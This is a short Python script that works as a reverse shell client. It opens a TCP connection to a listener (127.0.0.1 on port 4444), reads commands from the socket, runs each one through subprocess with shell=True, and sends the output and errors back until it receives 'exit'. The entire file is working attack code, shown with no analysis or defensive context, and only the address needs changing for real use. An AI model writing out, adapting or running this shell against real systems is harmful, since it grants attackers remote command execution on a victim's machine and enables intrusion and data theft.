#!/usr/bin/env python

import subprocess 
import socket 

def Connect():
    #
    host = '127.0.0.1' ; port = 4444
    #
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #
    s.connect((host,port))
    #
    while(True):
        #
        command = s.recv(1024)
        #
        if('exit' in command.decode()):
            #
            s.close()
            #
            break
            #
        else:
            #
            cmd = subprocess.Popen(command.decode(), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            #
            s.send(cmd.stdout.read())
            #
            s.send(cmd.stderr.read())

def main():
    #
    Connect()

if(__name__ == '__main__'):
    #
    main()        
    